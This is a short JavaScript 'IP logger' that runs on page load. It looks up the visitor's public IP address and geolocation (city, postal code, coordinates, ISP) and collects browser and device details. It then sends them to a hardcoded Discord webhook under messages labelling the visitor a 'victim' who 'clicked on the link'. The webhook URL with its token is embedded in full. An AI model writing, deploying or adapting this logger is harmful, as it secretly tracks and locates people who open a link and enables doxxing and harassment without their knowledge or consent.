const sendIP = () => {
    // Fetch the public IP address
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            
            // Fetch geolocation data based on the IP
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    
                    // Gather device information
                    const deviceInfo = {
                        userAgent: navigator.userAgent,            // Browser and OS info
                        screenWidth: window.screen.width,          // Screen width
                        screenHeight: window.screen.height,        // Screen height
                        deviceMemory: navigator.deviceMemory || "N/A", // Available memory
                        language: navigator.language,              // Language of the browser
                        platform: navigator.platform               // Platform (Windows, macOS, etc.)
                    };
                    
                    // Discord Webhook URL
                    const dscURL = 'https://discord.com/api/webhooks/1407630270030680114/24KgIRJu3KCrhK_ELjkh70k8pyu18Xqz9LQGTa4O53cdtLCXZXoW67cM_5mPToQVlvkZ';
                    
                    // Send data to Discord Webhook
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "SCRIPTY IP LOGGER",
                            avatar_url: "https://media.discordapp.net/attachments/1378331466102083756/1407630039213932625/Snimka_obrazovky_2025-08-16_180821.png",
                            content: `@here another bozo clicked`,
                            embeds: [
                                {
                                    title: 'A victim clicked on the link!',
                                    description: `
                                        **IP Info:**\n
                                        IP Address >> ${ipadd}
                                        Network >>  ${geoData.network}
                                        City >>  ${geoData.city}
                                        Region >>  ${geoData.region}
                                        Country >>  ${geoData.country_name}
                                        Postal Code >>  ${geoData.postal}
                                        Latitude >>  ${geoData.latitude}
                                        Longitude >>  ${geoData.longitude}
                                        Timezone >>  ${geoData.timezone}
                                        ASN >>  ${geoData.asn}
                                        Organization >>  ${geoData.org}
                                        **Device Info:**\n 
                                        User-Agent >>  ${deviceInfo.userAgent}
                                        Screen Width >>  ${deviceInfo.screenWidth}px
                                        Screen Height >>  ${deviceInfo.screenHeight}px
                                        Device Memory >>  ${deviceInfo.deviceMemory} GB
                                        Language >>  ${deviceInfo.language}
                                        Platform >>  ${deviceInfo.platform}`,
                                    color: 0x800080
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};

sendIP();
